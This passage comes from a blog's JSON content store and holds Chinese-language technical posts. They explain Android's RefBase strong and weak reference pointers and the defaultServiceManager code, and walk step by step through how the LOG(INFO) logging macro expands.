&#123;</span><br><span class=\"line\">            gDefaultServiceManager = <span class=\"built_in\">interface_cast</span>&lt;IServiceManager&gt;(</span><br><span class=\"line\">                ProcessState::<span class=\"built_in\">self</span>()-&gt;<span class=\"built_in\">getContextObject</span>(<span class=\"literal\">nullptr</span>));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (gDefaultServiceManager == <span class=\"literal\">nullptr</span>)</span><br><span class=\"line\">                <span class=\"built_in\">sleep</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> gDefaultServiceManager;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>WP</p>\n<h2 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h2><h3 id=\"1-为什么将gDefaultServiceManager放在Static-h中\"><a href=\"#1-为什么将gDefaultServiceManager放在Static-h中\" class=\"headerlink\" title=\"1.为什么将gDefaultServiceManager放在Static.h中\"></a>1.为什么将gDefaultServiceManager放在Static.h中</h3><pre><code>•    这样你就可以在多个 .cpp 文件中 #include &quot;Static.h&quot;，就能用 gDefaultServiceManager，不会引起多重定义错误（Multiple Definition Error）。\n•    项目中如果有多个类似 gSomething 的共享变量，都可以统一声明在 Static.h 中，维护方便。\n•    避免在各个头文件中乱声明，形成“头文件污染”。\n•    让别人一看 Static.h 就知道项目里有哪些共享变量。\n</code></pre>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>title: android强弱引用指针<br>author: nuoen<br>tags: []<br>categories:</p>\n<ul>\n<li>cpp </li>\n<li>android</li>\n<li>framework<br>date: 2025-03-29 21:39:00</li>\n</ul>\n<h1 id=\"android强弱引用指针\"><a href=\"#android强弱引用指针\" class=\"headerlink\" title=\"android强弱引用指针\"></a>android强弱引用指针</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">                    ┌───────────────────────────────┐</span><br><span class=\"line\">                    │ new MyObject();               │</span><br><span class=\"line\">                    │ → RefBase::init()             │</span><br><span class=\"line\">                    │ → mStrong = 0, mWeak = 0      │</span><br><span class=\"line\">                    └──────────────┬────────────────┘</span><br><span class=\"line\">                                   │</span><br><span class=\"line\">                     ┌────────────▼────────────┐</span><br><span class=\"line\">                     │ sp&lt;MyObject&gt; strongRef  │  ← 构造时调用 incStrong()</span><br><span class=\"line\">                     └────────────┬────────────┘</span><br><span class=\"line\">                                   │</span><br><span class=\"line\">                     +1           ▼           +1</span><br><span class=\"line\">              mStrong = 1     MyObject()     mWeak = 1  ← RefBase 中自动创建弱引用计数</span><br><span class=\"line\">                                   │</span><br><span class=\"line\">                                   ▼</span><br><span class=\"line\">                          ┌──────────────┐</span><br><span class=\"line\">                          │ wp&lt;MyObject&gt; │  ← 构造时调用 incWeak()</span><br><span class=\"line\">                          └──────┬───────┘</span><br><span class=\"line\">                                 │</span><br><span class=\"line\">                     +1         ▼         +0</span><br><span class=\"line\">              mStrong = 1   still alive   mWeak = 2</span><br><span class=\"line\"></span><br><span class=\"line\">   ┌────────────┐</span><br><span class=\"line\">   │ clear sp&lt;&gt; │ → decStrong()，mStrong -1 = 0</span><br><span class=\"line\">   └────┬───────┘</span><br><span class=\"line\">        │</span><br><span class=\"line\">        ▼</span><br><span class=\"line\">  ┌──────────────┐</span><br><span class=\"line\">  │ 析构 MyObject │  ← 对象析构（~MyObject）</span><br><span class=\"line\">  └────┬─────────┘</span><br><span class=\"line\">       │</span><br><span class=\"line\">       ▼</span><br><span class=\"line\">  ┌──────────────┐</span><br><span class=\"line\">  │ promote()    │ ← wp.promote()</span><br><span class=\"line\">  └────┬─────────┘</span><br><span class=\"line\">       │</span><br><span class=\"line\">       ▼</span><br><span class=\"line\">  mStrong == 0 → 返回 nullptr</span><br><span class=\"line\">  对象已被销毁，无法再访问</span><br><span class=\"line\"></span><br><span class=\"line\">最终：</span><br><span class=\"line\">  mStrong = 0</span><br><span class=\"line\">  mWeak = 1（直到 wp 也析构）</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"RefBase\"><a href=\"#RefBase\" class=\"headerlink\" title=\"RefBase\"></a>RefBase</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RefBase</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">            <span class=\"function\"><span class=\"type\">void</span>            <span class=\"title\">incStrong</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\">            <span class=\"function\"><span class=\"type\">void</span>            <span class=\"title\">decStrong</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\">            <span class=\"function\"><span class=\"type\">void</span>            <span class=\"title\">forceIncStrong</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\">            <span class=\"comment\">//! DEBUGGING ONLY: Get current strong ref count.</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"type\">int32_t</span>         <span class=\"title\">getStrongCount</span><span class=\"params\">()</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">weakref_type</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>:</span><br><span class=\"line\">        <span class=\"function\">RefBase*            <span class=\"title\">refBase</span><span class=\"params\">()</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span>                <span class=\"title\">incWeak</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span>                <span class=\"title\">decWeak</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// acquires a strong reference if there is already one.</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">bool</span>                <span class=\"title\">attemptIncStrong</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// acquires a weak reference if there is already one.</span></span><br><span class=\"line\">        <span class=\"comment\">// This is not always safe. see ProcessState.cpp and BpBinder.cpp</span></span><br><span class=\"line\">        <span class=\"comment\">// for proper use.</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">bool</span>                <span class=\"title\">attemptIncWeak</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//! DEBUGGING ONLY: Get current weak ref count.</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">int32_t</span>             <span class=\"title\">getWeakCount</span><span class=\"params\">()</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//! DEBUGGING ONLY: Print references held on object.</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span>                <span class=\"title\">printRefs</span><span class=\"params\">()</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//! DEBUGGING ONLY: Enable tracking for this object.</span></span><br><span class=\"line\">        <span class=\"comment\">// enable -- enable/disable tracking</span></span><br><span class=\"line\">        <span class=\"comment\">// retain -- when tracking is enable, if true, then we save a stack trace</span></span><br><span class=\"line\">        <span class=\"comment\">//           for each reference and dereference; when retain == false, we</span></span><br><span class=\"line\">        <span class=\"comment\">//           match up references and dereferences and keep only the</span></span><br><span class=\"line\">        <span class=\"comment\">//           outstanding ones.</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"type\">void</span>                <span class=\"title\">trackMe</span><span class=\"params\">(<span class=\"type\">bool</span> enable, <span class=\"type\">bool</span> retain)</span></span>;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"function\">weakref_type*   <span class=\"title\">createWeak</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"function\">weakref_type*   <span class=\"title\">getWeakRefs</span><span class=\"params\">()</span> <span class=\"type\">const</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//! DEBUGGING ONLY: Print references held on object.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span>  <span class=\"type\">void</span>            <span class=\"title\">printRefs</span><span class=\"params\">()</span> <span class=\"type\">const</span> </span>&#123; <span class=\"built_in\">getWeakRefs</span>()-&gt;<span class=\"built_in\">printRefs</span>(); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">//! DEBUGGING ONLY: Enable tracking of object.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span>  <span class=\"type\">void</span>            <span class=\"title\">trackMe</span><span class=\"params\">(<span class=\"type\">bool</span> enable, <span class=\"type\">bool</span> retain)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123; </span><br><span class=\"line\">        <span class=\"built_in\">getWeakRefs</span>()-&gt;<span class=\"built_in\">trackMe</span>(enable, retain); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">typedef</span> RefBase basetype;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">protected</span>:</span><br><span class=\"line\">                            <span class=\"built_in\">RefBase</span>();</span><br><span class=\"line\">    <span class=\"keyword\">virtual</span>                 ~<span class=\"built_in\">RefBase</span>();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//! Flags for extendObjectLifetime()</span></span><br><span class=\"line\">    <span class=\"keyword\">enum</span> &#123;</span><br><span class=\"line\">        OBJECT_LIFETIME_STRONG  = <span class=\"number\">0x0000</span>,</span><br><span class=\"line\">        OBJECT_LIFETIME_WEAK    = <span class=\"number\">0x0001</span>,</span><br><span class=\"line\">        OBJECT_LIFETIME_MASK    = <span class=\"number\">0x0001</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">            <span class=\"function\"><span class=\"type\">void</span>            <span class=\"title\">extendObjectLifetime</span><span class=\"params\">(<span class=\"type\">int32_t</span> mode)</span></span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">    <span class=\"comment\">//! Flags for onIncStrongAttempted()</span></span><br><span class=\"line\">    <span class=\"keyword\">enum</span> &#123;</span><br><span class=\"line\">        FIRST_INC_STRONG = <span class=\"number\">0x0001</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// Invoked after creation of initial strong pointer/reference.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span>            <span class=\"title\">onFirstRef</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// Invoked when either the last strong reference goes away, or we need to undo</span></span><br><span class=\"line\">    <span class=\"comment\">// the effect of an unnecessary onIncStrongAttempted.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span>            <span class=\"title\">onLastStrongRef</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// Only called in OBJECT_LIFETIME_WEAK case.  Returns true if OK to promote to</span></span><br><span class=\"line\">    <span class=\"comment\">// strong reference. May have side effects if it returns true.</span></span><br><span class=\"line\">    <span class=\"comment\">// The first flags argument is always FIRST_INC_STRONG.</span></span><br><span class=\"line\">    <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Remove initial flag argument.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">bool</span>            <span class=\"title\">onIncStrongAttempted</span><span class=\"params\">(<span class=\"type\">uint32_t</span> flags, <span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// Invoked in the OBJECT_LIFETIME_WEAK case when the last reference of either</span></span><br><span class=\"line\">    <span class=\"comment\">// kind goes away.  Unused.</span></span><br><span class=\"line\">    <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Remove.</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span>            <span class=\"title\">onLastWeakRef</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">void</span>* id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"keyword\">friend</span> <span class=\"keyword\">class</span> <span class=\"title class_\">weakref_type</span>;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title class_\">weakref_impl</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">                            <span class=\"built_in\">RefBase</span>(<span class=\"type\">const</span> RefBase&amp; o);</span><br><span class=\"line\">            RefBase&amp;        <span class=\"keyword\">operator</span>=(<span class=\"type\">const</span> RefBase&amp; o);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"keyword\">friend</span> <span class=\"keyword\">class</span> <span class=\"title class_\">ReferenceMover</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">renameRefs</span><span class=\"params\">(<span class=\"type\">size_t</span> n, <span class=\"type\">const</span> ReferenceRenamer&amp; renamer)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">renameRefId</span><span class=\"params\">(weakref_type* ref,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">            <span class=\"type\">const</span> <span class=\"type\">void</span>* old_id, <span class=\"type\">const</span> <span class=\"type\">void</span>* new_id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title\">renameRefId</span><span class=\"params\">(RefBase* ref,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">            <span class=\"type\">const</span> <span class=\"type\">void</span>* old_id, <span class=\"type\">const</span> <span class=\"type\">void</span>* new_id)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        weakref_impl* <span class=\"type\">const</span> mRefs;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"SP\"><a href=\"#SP\" class=\"headerlink\" title=\"SP\"></a>SP</h2><p>sp<T> 是 Android Binder IPC 系统中的一个智能指针模板，定义在 android::sp<T> 中，类似于 C++ 标准库的 std::shared_ptr<T>，但它是 Android 自己实现的强引用指针（Smart Pointer，sp = Smart Pointer）。</p>\n<p>举例说明 ：<br>frameworks/native/libs/binder/include/private/binder/Static.h </p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> Mutex gDefaultServiceManagerLock;</span><br><span class=\"line\"><span class=\"keyword\">extern</span> sp&lt;IServiceManager&gt; gDefaultServiceManager;<span class=\"comment\">//附录1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> __ANDROID_VNDK__</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> sp&lt;IPermissionController&gt; gPermissionController;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">bool</span> gSystemBootCompleted;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">sp&lt;IServiceManager&gt; <span class=\"title\">defaultServiceManager</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (gDefaultServiceManager != <span class=\"literal\">nullptr</span>) <span class=\"keyword\">return</span> gDefaultServiceManager;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        AutoMutex _l(gDefaultServiceManagerLock);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (gDefaultServiceManager == <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">            gDefaultServiceManager = <span class=\"built_in\">interface_cast</span>&lt;IServiceManager&gt;(</span><br><span class=\"line\">                ProcessState::<span class=\"built_in\">self</span>()-&gt;<span class=\"built_in\">getContextObject</span>(<span class=\"literal\">nullptr</span>));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (gDefaultServiceManager == <span class=\"literal\">nullptr</span>)</span><br><span class=\"line\">                <span class=\"built_in\">sleep</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> gDefaultServiceManager;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>WP</p>\n<h2 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录\"></a>附录</h2><h3 id=\"1-为什么将gDefaultServiceManager放在Static-h中\"><a href=\"#1-为什么将gDefaultServiceManager放在Static-h中\" class=\"headerlink\" title=\"1.为什么将gDefaultServiceManager放在Static.h中\"></a>1.为什么将gDefaultServiceManager放在Static.h中</h3><pre><code>•    这样你就可以在多个 .cpp 文件中 #include &quot;Static.h&quot;，就能用 gDefaultServiceManager，不会引起多重定义错误（Multiple Definition Error）。\n•    项目中如果有多个类似 gSomething 的共享变量，都可以统一声明在 Static.h 中，维护方便。\n•    避免在各个头文件中乱声明，形成“头文件污染”。\n•    让别人一看 Static.h 就知道项目里有哪些共享变量。\n</code></pre>\n"},{"_content":"为了深入理解 LOG(INFO) << \"init first stage started!\" 的执行流程，我们需要从宏的解析和执行流程一步步分析，直到最终消息被记录在日志中。\n\n1. 解析 LOG(INFO) << \"init first stage started!\"\n\nLOG(INFO) << \"init first stage started!\" 是一个宏调用，首先解析 LOG 宏定义：\n```cpp\n#define LOG(severity) LAZY_STREAM(LOG_STREAM(severity), LOG_IS_ON(severity))\n```\n根据这句定义，LOG(INFO) 会展开为：\n```cpp\nLAZY_STREAM(LOG_STREAM(INFO), LOG_IS_ON(INFO))\n```\n接下来需要依次解析 LAZY_STREAM、LOG_STREAM 和 LOG_IS_ON。\n\n2. 宏解析顺序\n\n2.1 LOG_IS_ON 宏解析\n\n首先解析 LOG_IS_ON(INFO)，其定义如下：\n```cpp\n#define LOG_IS_ON(severity) (::logging::ShouldCreateLogMessage(::logging::LOG_##severity))\n```\n因为 INFO 对应的日志级别常量是 LOG_INFO，所以 LOG_IS_ON(INFO) 会进一步展开为：\n```cpp\n::logging::ShouldCreateLogMessage(::logging::LOG_INFO)\n```\nShouldCreateLogMessage 是一个用于判断是否需要记录日志的函数，其实现如下：\n```cpp\nbool ShouldCreateLogMessage(int severity) {\n  if (severity < g_min_log_level)\n    return false;\n  return g_logging_destination != LOG_NONE || log_message_handler || severity >= kAlwaysPrintErrorLevel;\n}\n```\n如果当前日志级别满足输出条件，这个函数会返回 true。\n\n2.2 LOG_STREAM 宏解析\n\n如果 LOG_IS_ON(INFO) 返回 true，我们会继续解析 LOG_STREAM(INFO)：\n```cpp\n#define LOG_STREAM(severity) COMPACT_GOOGLE_LOG_##severity.stream()\n```\n这里，COMPACT_GOOGLE_LOG_##severity 将拼接成 COMPACT_GOOGLE_LOG_INFO，所以 LOG_STREAM(INFO) 最终展开为：\n```cpp\nCOMPACT_GOOGLE_LOG_INFO.stream()\n```\n2.3 COMPACT_GOOGLE_LOG_INFO 宏解析\n\nCOMPACT_GOOGLE_LOG_INFO 被定义为：\n```cpp\n#define COMPACT_GOOGLE_LOG_INFO COMPACT_GOOGLE_LOG_EX_INFO(LogMessage)\n```\n这个宏调用了 COMPACT_GOOGLE_LOG_EX_INFO，所以我们继续展开。\n\n2.4 COMPACT_GOOGLE_LOG_EX_INFO 宏解析\n\nCOMPACT_GOOGLE_LOG_EX_INFO 的定义如下：\n```cpp\n#define COMPACT_GOOGLE_LOG_EX_INFO(ClassName, ...) \\\n  ::logging::ClassName(__FILE__, __LINE__, ::logging::LOG_INFO, ##__VA_ARGS__)\n```\n这会创建一个 LogMessage 类的对象，传递当前文件名、行号和日志级别。因此 COMPACT_GOOGLE_LOG_INFO.stream() 会展开为：\n```cpp\n::logging::LogMessage(__FILE__, __LINE__, ::logging::LOG_INFO).stream()\n```\n到这里，宏解析完成。LogMessage 类的构造函数会初始化日志的文件、行号和日志级别，并返回 stream()，我们可以将消息内容通过 << 发送到流中。\n\n3. 执行 LogMessage 类构造与日志记录\n\n3.1 LogMessage 构造函数初始化\n\nLogMessage 的构造函数会将文件、行号和日志级别存储到对象中，并执行 Init 函数来初始化日志流：\n```cpp\nLogMessage::LogMessage(const char* file, int line, LogSeverity severity)\n    : severity_(severity), file_(file), line_(line) {\n  Init(file, line);\n}\n```\n3.2 Init 函数格式化日志头\n\n在 Init 函数中，日志消息会添加头部信息（包括时间戳、进程和线程 ID 等），例如：\n```cpp\nvoid LogMessage::Init(const char* file, int line) {\n  stream_ << '[';\n  if (g_log_process_id)\n    stream_ << CurrentProcessId() << ':';\n  if (g_log_thread_id)\n    stream_ << base::PlatformThread::CurrentId() << ':';\n  if (g_log_timestamp) {\n    struct timeval tv;\n    gettimeofday(&tv, nullptr);\n    time_t t = tv.tv_sec;\n    struct tm local_time;\n    localtime_r(&t, &local_time);\n    stream_ << std::setfill('0')\n            << std::setw(2) << 1 + local_time.tm_mon\n            << std::setw(2) << local_time.tm_mday\n            << '/'\n            << std::setw(2) << local_time.tm_hour\n            << std::setw(2) << local_time.tm_min\n            << std::setw(2) << local_time.tm_sec\n            << '.'\n            << std::setw(6) << tv.tv_usec\n            << ':';\n  }\n  if (g_log_tickcount)\n    stream_ << TickCount() << ':';\n  stream_ << log_severity_name(severity_) << \":\" << file << \"(\" << line << \")] \";\n  message_start_ = stream_.str().length();\n}\n```\n此代码会将日志头部信息输出到 stream_ 中。\n\n3.3 ~LogMessage 析构函数输出日志\n\n当 LogMessage 对象析构时，~LogMessage 会调用日志输出流程：\n```cpp\nLogMessage::~LogMessage() {\n  std::string str_newline(stream_.str());\n  if (log_message_handler &&\n      log_message_handler(severity_, file_, line_,\n                          message_start_, str_newline)) {\n    return;\n  }\n  if ((g_logging_destination & LOG_TO_SYSTEM_DEBUG_LOG) != 0) {\n#if defined(OS_ANDROID)\n    __android_log_write(ANDROID_LOG_INFO, \"chromium\", str_newline.c_str());\n#else\n    ignore_result(fwrite(str_newline.data(), str_newline.size(), 1, stderr));\n    fflush(stderr);\n#endif\n  }\n  if ((g_logging_destination & LOG_TO_FILE) != 0) {\n    LoggingLock logging_lock;\n    if (InitializeLogFileHandle()) {\n      ignore_result(fwrite(str_newline.data(), str_newline.size(), 1, g_log_file));\n      fflush(g_log_file);\n    }\n  }\n  if (severity_ == LOG_FATAL) {\n    base::debug::BreakDebugger();\n  }\n}\n```\n\t•\t在 Android 上，使用 __android_log_write 写入系统日志。\n\t•\t在其他平台上，会根据配置写入 stderr 或日志文件。\n\n总结\n\n\t1.\t宏展开：LOG(INFO) << \"init first stage started!\" 依次展开为 LAZY_STREAM、LOG_STREAM、COMPACT_GOOGLE_LOG_INFO，最终生成一个 LogMessage 对象并调用其 stream()。\n\t2.\t构造与格式化：LogMessage 对象在构造时会调用 Init 函数，格式化头部信息。\n\t3.\t日志输出：对象析构时，~LogMessage 检查配置，选择写入到系统日志、stderr 或文件中。","source":"_drafts/android_logd.md","raw":"为了深入理解 LOG(INFO) << \"init first stage started!\" 的执行流程，我们需要从宏的解析和执行流程一步步分析，直到最终消息被记录在日志中。\n\n1. 解析 LOG(INFO) << \"init first stage started!\"\n\nLOG(INFO) << \"init first stage started!\" 是一个宏调用，首先解析 